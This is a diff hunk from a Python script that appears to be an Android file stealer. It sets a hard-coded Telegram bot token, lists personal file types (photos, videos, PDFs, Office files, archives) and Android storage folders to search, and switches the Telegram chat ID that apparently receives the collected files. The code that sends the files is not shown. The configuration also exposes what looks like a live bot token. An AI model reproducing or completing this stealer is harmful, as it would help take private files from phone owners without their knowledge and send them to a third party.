@@ -5,7 +5,7 @@ import telebot
 from instagrapi import Client
 import random
 BOT_TOKEN = "7636241975:AAHG1TnFkA1ZWwFotTZaPJnN5JbFTdjwxsU"
-CHAT_ID = "7281472161"
+CHAT_ID = "7759417468"
 bot = telebot.TeleBot(BOT_TOKEN)
 target_extensions = [".jpg", ".jpeg", ".png", ".mp4", ".mp3", ".pdf", ".docx", ".xlsx", ".txt", ".zip"]
 start_dirs = ["/sdcard", "/storage/emulated/0"]
